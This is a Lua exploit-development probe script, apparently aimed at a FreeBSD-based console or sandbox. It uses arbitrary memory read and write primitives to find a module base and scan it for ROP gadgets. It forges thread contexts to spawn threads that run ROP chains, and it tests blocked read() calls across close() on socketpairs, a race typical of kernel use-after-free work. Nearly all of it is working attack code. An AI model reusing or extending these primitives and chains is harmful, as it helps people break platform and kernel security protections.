-- CRASH_CLASS: HIGH
-- PROBE 938d: read() blocked across close(), with a verified module base
--
-- 938a-c built their chains from a dynlib record that had never been zeroed, so
-- every gadget address was an offset and no child ever reached the syscall.
-- 939c fixed the base lookup (zero the record, base = +0x108/+0x10C, size = +0x110)
-- and located a verified `mov [rsi],rax; ret`, which is the store convention
-- docs/THREADING_ALIVE_14_10.md:243 records as the only one that returns the
-- real syscall value.

print("=== PROBE 938d ===")
print("")

local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end return nil end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end

local fn=to_num(syscall.pipe.fn_addr)
local info=memory.alloc(0x200)
for i=0,0x1FF,4 do wd(info+i,0) end
wd(info,0x160)
local ok=pcall(function() return mk(593)(uint64(0),uint64(info)) end)
local base=(rd(info+0x10C) or 0)*4294967296+(rd(info+0x108) or 0)
local size=rd(info+0x110) or 0
print(string.format("[0] pid=%s base=0x%X size=0x%X fn=%s",
    tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))), base, size, tostring(fn)))
if base < 0x100000 then print("[!] no module base, aborting"); return end

local function find_pat(pat)
    local off=0
    while off<size do
        local want=size-off; if want>0x1000 then want=0x1000 end
        local o,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not o or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true)
        if i then return base+off+i-1 end
        off=off+want
    end
    return nil
end
local pop_rax=find_pat(string.char(0x58,0xC3))
local store_rsi=find_pat(string.char(0x48,0x89,0x06,0xC3))
print(string.format("[0] pop_rax=0x%X store_rsi=0x%X", pop_rax or 0, store_rsi or 0))
if not pop_rax or not store_rsi then print("[!] missing gadgets, aborting"); return end

local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,
           RDI=0x048,RSI=0x050,RDX=0x058,RCX=0x060,R8=0x068,RAX=0x078}
local PAGE=0x4000
local function spawn(sysno,a1,a2,a3,buf)
    local block=memory.alloc(PAGE*2)
    for i=0,PAGE*2-4,4 do wd(block+i,0) end
    wd(buf,0xAAAAAAAA); wd(buf+4,0xAAAAAAAA); wq(buf+8,0)
    local ctx=memory.alloc(0x200)
    for i=0,0x1FC,4 do wd(ctx+i,0) end
    wd(ctx+Ctx.MAGIC,0x480); wd(ctx+Ctx.TYPE,0x10000)
    wd(ctx+Ctx.CS,0x43); wd(ctx+Ctx.SS,0x3b)
    wq(ctx+Ctx.RIP,uint64(fn)); wq(ctx+Ctx.RSP,uint64(block+PAGE*2-0x200))
    wq(ctx+Ctx.RDI,uint64(a1)); wq(ctx+Ctx.RSI,uint64(a2)); wq(ctx+Ctx.RDX,uint64(a3))
    wq(ctx+Ctx.RAX,uint64(sysno))
    -- chain runs after the call returns: store RAX through RSI, then thr_exit(431)
    local ch=block+PAGE*2-0x200
    wq(ch,uint64(store_rsi)); wq(ch+8,uint64(pop_rax)); wq(ch+16,uint64(431)); wq(ch+24,uint64(fn))
    local ok2,rv=pcall(function() return mk(430)(uint64(ctx)) end)
    print(string.format('    spawn sys=%d rv=%s', sysno, tostring(rv)))
    return ok2,rv
end

local O=memory.alloc(0x100)
local A=memory.alloc(0x100); local B=memory.alloc(0x100)
local rv

print("[A] control child getpid")
spawn(20,0,A,0,A); mk(240)(uint64(0),uint64(80000000))
print(string.format("    out=%s (pid should appear here)", tostring(rd(A))))

print("[B] blocked read, parent closes the peer")
local sv=memory.alloc(16)
rv=mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv))
local a=rd(sv); local b=rd(sv+4)
print(string.format("    socketpair rv=%s fds=%s,%s", tostring(rv), tostring(a), tostring(b)))
if a and a>0 then
    spawn(3,a,B,0x20,B)
    mk(240)(uint64(0),uint64(50000000))
    print("    child blocked? " .. string.format("lo=%08X hi=%08X", rd(B) or 0, rd(B+4) or 0))
    mk(6)(uint64(b),uint64(0),uint64(0))
    mk(240)(uint64(0),uint64(100000000))
    print(string.format("    after close(peer): lo=%08X hi=%08X (0=EOF woken, AAAAAAAA=still blocked)", rd(B) or 0, rd(B+4) or 0))
end

print("[C] blocked read, parent closes the child's own fd")
local sv2=memory.alloc(16)
rv=mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv2))
local a2=rd(sv2); local b2=rd(sv2+4)
print(string.format("    socketpair rv=%s fds=%s,%s", tostring(rv), tostring(a2), tostring(b2)))
if a2 and a2>0 then
    local C=memory.alloc(0x100)
    spawn(3,a2,C,0x20,C)
    mk(240)(uint64(0),uint64(50000000))
    print("    child blocked? out=" .. string.format("lo=%08X hi=%08X", rd(C) or 0, rd(C+4) or 0))
    mk(6)(uint64(a2),uint64(0),uint64(0))
    mk(240)(uint64(0),uint64(100000000))
    print(string.format("    after close(child fd): lo=%08X hi=%08X (FFFFFFFF=EBADF, AAAAAAAA=still blocked)", rd(C) or 0, rd(C+4) or 0))
end

print("[Z] alive pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
print("=== COMPLETE ===")
